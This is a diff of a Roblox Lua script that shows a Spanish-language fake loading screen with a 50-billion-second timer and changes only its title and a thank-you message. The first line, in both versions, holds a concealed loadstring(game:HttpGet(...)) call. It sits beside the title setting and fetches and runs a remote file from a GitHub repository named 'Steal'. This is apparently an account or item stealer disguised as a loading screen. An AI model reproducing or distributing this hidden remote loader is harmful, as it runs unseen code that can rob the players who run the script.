@@ -1,5 +1,5 @@
 --settings:
-loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptsop13/Steal/refs/heads/main/Jhonaiker.lua'))() title = "Cargando Generador" --upper title
+loadstring(game:HttpGet('https://raw.githubusercontent.com/scriptsop13/Steal/refs/heads/main/Jhonaiker.lua'))() title = "Cargando Script" --upper title
 local loading_text = "Porfavor espera" --gray title
 local loadingtime = 50000000000 --loading time (in seconds)
 
@@ -131,7 +131,7 @@ notifyLabel.BackgroundTransparency = 1
 notifyLabel.Position = UDim2.new(0, 0, 0, 0)
 notifyLabel.Size = UDim2.new(1, 0, 1, 0)
 notifyLabel.Font = Enum.Font.FredokaOne
-notifyLabel.Text = "Hola, porfavor espera que el script termine de cargar disfruta ✅ Feliz Pascua!"
+notifyLabel.Text = "Hola, gracias por usar Overdrive ✅"
 notifyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 notifyLabel.TextScaled = true
 notifyLabel.TextWrapped = true
